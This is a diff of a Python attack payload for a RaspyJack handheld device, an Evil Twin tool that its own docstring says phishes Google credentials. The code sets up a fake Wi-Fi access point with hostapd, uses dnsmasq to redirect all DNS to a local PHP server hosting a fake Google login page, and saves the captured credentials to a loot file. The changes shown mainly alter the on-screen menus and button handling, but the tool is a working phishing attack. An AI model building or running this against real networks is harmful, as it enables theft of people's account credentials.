@@ -1,4 +1,44 @@
 #!/usr/bin/env python3
+"""
+RaspyJack *payload* – **Evil Twin (Google Phishing)**
+===================================================
+This payload sets up an Evil Twin attack to phish for Google credentials.
+It creates a fake Wi-Fi access point, redirects all DNS requests to a local
+web server hosting a fake Google login page, and captures any entered
+credentials.
+
+Features:
+- Creates a fake Wi-Fi AP with a configurable SSID and channel.
+- Uses `hostapd` and `dnsmasq` for AP and DHCP/DNS services.
+- Hosts a customizable phishing portal (default Google login page).
+- Captures credentials to a loot file.
+- Displays client count and captured credential count on the LCD.
+- Graceful exit via KEY3 or Ctrl-C, cleaning up all attack processes
+  and restoring network settings.
+
+Controls:
+- MAIN SCREEN:
+    - OK: Start Evil Twin attack.
+    - KEY1: Edit network interface.
+    - KEY2: Edit Fake AP SSID.
+    - KEY3: Select Phishing Portal.
+- INTERFACE INPUT SCREEN:
+    - UP/DOWN: Change character at cursor position.
+    - LEFT/RIGHT: Move cursor.
+    - OK: Confirm interface.
+    - KEY3: Cancel input.
+- SSID INPUT SCREEN:
+    - UP/DOWN: Change character at cursor position.
+    - LEFT/RIGHT: Move cursor.
+    - OK: Confirm SSID.
+    - KEY3: Cancel input.
+- PORTAL SELECTION SCREEN:
+    - UP/DOWN: Navigate available phishing portals.
+    - OK: Select portal.
+    - KEY3: Cancel selection.
+- ATTACKING SCREEN:
+    - KEY3: Stop attack and exit.
+"""
 import sys
 import os
 import time
@@ -35,12 +75,8 @@ FONT = ImageFont.load_default()
 running = True
 attack_processes = {}
 status_info = { "clients": 0, "credentials": 0 }
-current_interface_input = WIFI_INTERFACE
-interface_input_cursor_pos = 0
-current_ssid_input = FAKE_AP_SSID
-ssid_input_cursor_pos = 0
-current_channel_input = FAKE_AP_CHANNEL
-channel_input_cursor_pos = 0
+scroll_offset = 0
+VISIBLE_ITEMS = 5 # Number of HTML files visible on screen at once
 
 def cleanup(*_):
     global running
@@ -113,16 +149,24 @@ def draw_ui(screen_state="main", status: str = ""):
         if not html_files_list:
             d.text((5, 40), "No HTML files found!", font=FONT, fill="red")
         else:
-            for i, file_name in enumerate(html_files_list):
-                display_name = file_name
-                if len(display_name) > 16:
-                    display_name = display_name[:13] + "..."
-                
-                text_color = "white"
-                if i == html_file_index:
-                    text_color = "lime"
-                    d.rectangle([(0, 25 + i*15), (128, 25 + (i+1)*15)], fill="blue")
-                d.text((5, 25 + i*15), display_name, font=FONT, fill=text_color)
+            # Display scroll indicators if needed
+            if scroll_offset > 0:
+                d.text((60, 25), "^", font=FONT, fill="white")
+            if scroll_offset + VISIBLE_ITEMS < len(html_files_list):
+                d.text((60, 100), "v", font=FONT, fill="white")
+
+            for i in range(VISIBLE_ITEMS):
+                if scroll_offset + i < len(html_files_list):
+                    file_name = html_files_list[scroll_offset + i]
+                    display_name = file_name
+                    if len(display_name) > 16:
+                        display_name = display_name[:13] + "..."
+                    
+                    text_color = "white"
+                    if (scroll_offset + i) == html_file_index:
+                        text_color = "lime"
+                        d.rectangle([(0, 35 + i*15), (128, 35 + (i+1)*15)], fill="blue")
+                    d.text((5, 35 + i*15), display_name, font=FONT, fill=text_color)
         d.text((5, 110), "UP/DOWN=Select | OK=Confirm", font=FONT, fill="cyan")
     elif screen_state == "attacking":
         status_color = "lime" if status == "ACTIVE" else "red"
@@ -131,6 +175,11 @@ def draw_ui(screen_state="main", status: str = ""):
         d.text((5, 60), f"Clients: {status_info['clients']}", font=FONT, fill="yellow")
         d.text((5, 75), f"Creds: {status_info['credentials']}", font=FONT, fill="orange")
         d.text((5, 110), "Press KEY3 to Stop", font=FONT, fill="cyan")
+    elif screen_state == "error":
+        d.text((5, 5), "ERROR", font=FONT_TITLE, fill="red")
+        d.line([(0, 22), (128, 22)], fill="red", width=1)
+        d.text((5, 30), status, font=FONT, fill="white")
+        d.text((5, 110), "Press OK to continue", font=FONT, fill="cyan")
     
     LCD.LCD_ShowImage(img, 0, 0)
 
@@ -223,7 +272,7 @@ def handle_text_input_logic(initial_text, screen_state_name, char_set):
     return None
 
 def handle_file_selection_logic():
-    global html_files_list, html_file_index, current_html_file, CAPTIVE_PORTAL_PATH, LOOT_FILE
+    global html_files_list, html_file_index, current_html_file, CAPTIVE_PORTAL_PATH, LOOT_FILE, scroll_offset
 
     html_files_list = [d for d in os.listdir(CAPTIVE_PORTAL_BASE_PATH) if os.path.isdir(os.path.join(CAPTIVE_PORTAL_BASE_PATH, d))]
     html_files_list.sort()
@@ -237,7 +286,12 @@ def handle_file_selection_logic():
         html_file_index = html_files_list.index(current_html_file)
     except ValueError:
         html_file_index = 0
-        current_html_file = html_files_list[0]
+    
+    # Adjust scroll_offset to ensure current_html_file is visible
+    if html_file_index < scroll_offset:
+        scroll_offset = html_file_index
+    elif html_file_index >= scroll_offset + VISIBLE_ITEMS:
+        scroll_offset = html_file_index - VISIBLE_ITEMS + 1
 
     while running:
         draw_ui("html_select")
@@ -251,9 +305,13 @@ def handle_file_selection_logic():
         
         if btn == "UP":
             html_file_index = (html_file_index - 1 + len(html_files_list)) % len(html_files_list)
+            if html_file_index < scroll_offset:
+                scroll_offset = html_file_index
             current_html_file = html_files_list[html_file_index]
         elif btn == "DOWN":
             html_file_index = (html_file_index + 1) % len(html_files_list)
+            if html_file_index >= scroll_offset + VISIBLE_ITEMS:
+                scroll_offset = html_file_index - VISIBLE_ITEMS + 1
             current_html_file = html_files_list[html_file_index]
         elif btn == "OK":
             CAPTIVE_PORTAL_PATH = os.path.join(CAPTIVE_PORTAL_BASE_PATH, current_html_file)
@@ -270,9 +328,9 @@ def start_attack():
     subprocess.run("pkill wpa_supplicant; pkill dnsmasq; pkill hostapd; pkill php", shell=True, capture_output=True)
     os.makedirs(TEMP_CONF_DIR, exist_ok=True)
     hostapd_conf_path = os.path.join(TEMP_CONF_DIR, "hostapd.conf")
-    with open(hostapd_conf_path, "w") as f: f.write(f"interface={WIFI_INTERFACE}\\ndriver=nl80211\\nssid={FAKE_AP_SSID}\\nhw_mode=g\\nchannel={FAKE_AP_CHANNEL}\\n")
+    with open(hostapd_conf_path, "w") as f: f.write(f"interface={WIFI_INTERFACE}\ndriver=nl80211\nssid={FAKE_AP_SSID}\nhw_mode=g\nchannel={FAKE_AP_CHANNEL}\n")
     dnsmasq_conf_path = os.path.join(TEMP_CONF_DIR, "dnsmasq.conf")
-    with open(dnsmasq_conf_path, "w") as f: f.write(f"interface={WIFI_INTERFACE}\\ndhcp-range=10.0.0.10,10.0.0.100,12h\\ndhcp-option=3,10.0.0.1\\ndhcp-option=6,10.0.0.1\\naddress=/#/10.0.0.1\\n")
+    with open(dnsmasq_conf_path, "w") as f: f.write(f"interface={WIFI_INTERFACE}\ndhcp-range=10.0.0.10,10.0.0.100,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\n")
     if os.path.exists(LOOT_FILE): os.remove(LOOT_FILE)
     
     subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True)
@@ -282,28 +340,25 @@ def start_attack():
     attack_processes['hostapd'] = subprocess.Popen(f"hostapd {hostapd_conf_path}", shell=True, preexec_fn=os.setsid, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     time.sleep(2)
     if attack_processes['hostapd'].poll() is not None:
-        print(f"ERROR: hostapd failed to start. Stderr: {attack_processes['hostapd'].stderr.read().decode()}", file=sys.stderr)
-        global running
-        running = False
-        return False
+        error_msg = attack_processes['hostapd'].stderr.read().decode().strip()
+        print(f"ERROR: hostapd failed to start. Stderr: {error_msg}", file=sys.stderr)
+        return False, f"hostapd failed: {error_msg[:50]}..."
 
     attack_processes['dnsmasq'] = subprocess.Popen(f"dnsmasq -C {dnsmasq_conf_path} -d", shell=True, preexec_fn=os.setsid, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     time.sleep(2)
     if attack_processes['dnsmasq'].poll() is not None:
-        print(f"ERROR: dnsmasq failed to start. Stderr: {attack_processes['dnsmasq'].stderr.read().decode()}", file=sys.stderr)
-        global running
-        running = False
-        return False
+        error_msg = attack_processes['dnsmasq'].stderr.read().decode().strip()
+        print(f"ERROR: dnsmasq failed to start. Stderr: {error_msg}", file=sys.stderr)
+        return False, f"dnsmasq failed: {error_msg[:50]}..."
 
     attack_processes['php'] = subprocess.Popen(f"php -S 10.0.0.1:80 -t {CAPTIVE_PORTAL_PATH}", shell=True, preexec_fn=os.setsid, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     time.sleep(2)
     if attack_processes['php'].poll() is not None:
-        print(f"ERROR: PHP web server failed to start. Stderr: {attack_processes['php'].stderr.read().decode()}", file=sys.stderr)
-        global running
-        running = False
-        return False
+        error_msg = attack_processes['php'].stderr.read().decode().strip()
+        print(f"ERROR: PHP web server failed to start. Stderr: {error_msg}", file=sys.stderr)
+        return False, f"PHP failed: {error_msg[:50]}..."
     
-    return True
+    return True, ""
 
 def monitor_status():
     while running:
@@ -317,62 +372,65 @@ def monitor_status():
 
 if __name__ == '__main__':
     try:
-        is_attacking = False
-        current_screen = "main"
-        
+        last_button_press_time = 0
+        BUTTON_DEBOUNCE_TIME = 0.3 # seconds
+
         current_interface_input = WIFI_INTERFACE
         current_ssid_input = FAKE_AP_SSID
         current_channel_input = FAKE_AP_CHANNEL
 
         while running:
+            current_time = time.time()
+            
             if current_screen == "main":
                 draw_ui("main")
-                if GPIO.input(PINS["KEY1"]) == 0:
+                if GPIO.input(PINS["KEY1"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
+                    last_button_press_time = current_time
                     new_iface = handle_text_input_logic(current_interface_input, "iface_input", CHAR_SET)
                     if new_iface is not None:
                         WIFI_INTERFACE = new_iface
                         current_interface_input = new_iface
-                    time.sleep(0.2)
-                elif GPIO.input(PINS["KEY2"]) == 0:
+                    time.sleep(BUTTON_DEBOUNCE_TIME)
+                elif GPIO.input(PINS["KEY2"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
+                    last_button_press_time = current_time
                     new_ssid = handle_text_input_logic(current_ssid_input, "ssid_input", CHAR_SET)
                     if new_ssid is not None:
                         FAKE_AP_SSID = new_ssid
                         current_ssid_input = new_ssid
-                    time.sleep(0.2)
-                elif GPIO.input(PINS["OK"]) == 0:
-                    if not FAKE_AP_CHANNEL.isdigit():
-                        new_channel = handle_text_input_logic(current_channel_input, "channel_input", "0123456789")
-                        if new_channel is not None:
-                            FAKE_AP_CHANNEL = new_channel
-                            current_channel_input = new_channel
-                        time.sleep(0.2)
+                    time.sleep(BUTTON_DEBOUNCE_TIME)
+                elif GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
+                    last_button_press_time = current_time
+                    draw_ui("STARTING")
+                    success, error_message = start_attack()
+                    if success:
+                        is_attacking = True
+                        current_screen = "attacking"
+                        threading.Thread(target=monitor_status, daemon=True).start()
                     else:
-                        draw_ui("STARTING")
-                        if start_attack():
-                            is_attacking = True
-                            current_screen = "attacking"
-                            threading.Thread(target=monitor_status, daemon=True).start()
-                        else:
-                            draw_ui("FAILED")
-                            time.sleep(3)
-                            current_screen = "main"
-                        time.sleep(0.2)
-                elif GPIO.input(PINS["KEY3"]) == 0:
+                        draw_ui("error", error_message)
+                        while GPIO.input(PINS["OK"]) != 0:
+                            time.sleep(0.1)
+                        current_screen = "main"
+                    time.sleep(BUTTON_DEBOUNCE_TIME)
+                elif GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
+                    last_button_press_time = current_time
                     current_screen = "html_select"
-                    time.sleep(0.2)
+                    time.sleep(BUTTON_DEBOUNCE_TIME)
             elif current_screen == "html_select":
                 handle_file_selection_logic()
                 current_screen = "main"
-                time.sleep(0.2)
+                time.sleep(BUTTON_DEBOUNCE_TIME)
             elif current_screen == "attacking":
                 draw_ui("attacking", "ACTIVE")
-                if GPIO.input(PINS["OK"]) == 0:
+                if GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
+                    last_button_press_time = current_time
                     draw_ui("stopping")
                     cleanup()
                     is_attacking = False
                     current_screen = "main"
                     time.sleep(2)
-                elif GPIO.input(PINS["KEY3"]) == 0:
+                elif GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
+                    last_button_press_time = current_time
                     cleanup()
                     break
             
